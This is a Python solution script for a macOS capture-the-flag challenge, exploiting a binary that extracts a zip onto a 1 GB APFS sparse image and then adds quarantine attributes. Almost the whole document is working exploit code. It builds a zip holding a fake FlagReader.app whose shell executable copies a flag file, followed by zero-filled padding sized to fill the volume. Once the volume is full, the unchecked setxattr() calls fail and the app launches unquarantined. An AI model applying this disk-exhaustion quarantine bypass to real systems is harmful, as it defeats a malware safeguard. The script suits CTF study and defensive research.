#!/usr/bin/env python3
#
#  Solution
#  --------
#  1. The "gates_bill" binary creates a 1 GB APFS sparse image and extracts our zip into it.
#  2. After extraction, the binary adds a "com.apple.quarnatine" xattr with flags "0041" into each file.
#  3. Finally, the binary launches an extracted "FlagReader.app" via the "open" utility.
#  4. The critical issue - setxattr() calls are not checked against failure.
#  5. Exploitation involves filling up the APFS volume to exactly its maximum write-limit and then making setxattr() fail with ENOSPC.
#
import os
import stat
import zipfile

# Output zip file
OUTPUT_ZIP = 'exploit.zip'

# Calibrated for `hdiutil create -size 1g -type SPARSE -fs APFS`.
# FlagReader.app consumes ~3 data blocks; total target: 255,937 blocks.
FILLER_BLOCKS = 255_934
FILLER_SIZE = FILLER_BLOCKS * 4096

# The "FlagReader.app" plist
PLIST = b'''\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>FlagReader</string>
    <key>CFBundleIdentifier</key>
    <string>com.ctf.flagreader</string>
    <key>CFBundleName</key>
    <string>FlagReader</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>LSUIElement</key>
    <true/>
    <key>LSMinimumSystemVersion</key>
    <string>10.15</string>
</dict>
</plist>
'''

# Shell script run by Launch Services
FLAGREADER_SCRIPT = b'''
#!/bin/bash
cp /Users/ctf/flag /tmp/ctf_flag
chmod 644 /tmp/ctf_flag
'''

def create_exploit_zip(output:str=OUTPUT_ZIP, filler_size:int=FILLER_SIZE):
    """
        Creates the exploit zip file.
    """

    # Create the zipfile
    with zipfile.ZipFile(output, 'w') as zf:

        # FlagReader.app — must be come first before the filler fills the disk
        zf.writestr('FlagReader.app/Contents/Info.plist', PLIST)
        exe_info = zipfile.ZipInfo('FlagReader.app/Contents/MacOS/FlagReader')
        exe_info.compress_type = zipfile.ZIP_DEFLATED
        exe_info.external_attr = (stat.S_IFREG | 0o755) << 16
        zf.writestr(exe_info, FLAGREADER_SCRIPT)

        # 2. Large filler — zeros deflate to ~0 bytes but expand to ~1 GB on disk.
        filler_info = zipfile.ZipInfo('filler.bin')
        filler_info.compress_type = zipfile.ZIP_DEFLATED
        chunk = b'\x00' * (4 * 1024 * 1024)
        remaining = filler_size
        with zf.open(filler_info, 'w') as fout:
            while remaining > 0:
                n = min(len(chunk), remaining)
                fout.write(chunk[:n])
                remaining -= n

    zip_bytes = os.path.getsize(output)
    print('Run:')
    print(f'  /Users/ctf/gates_bill $(pwd)/{output}')
    print('  cat /tmp/ctf_flag')

if __name__ == '__main__':
    create_exploit_zip()
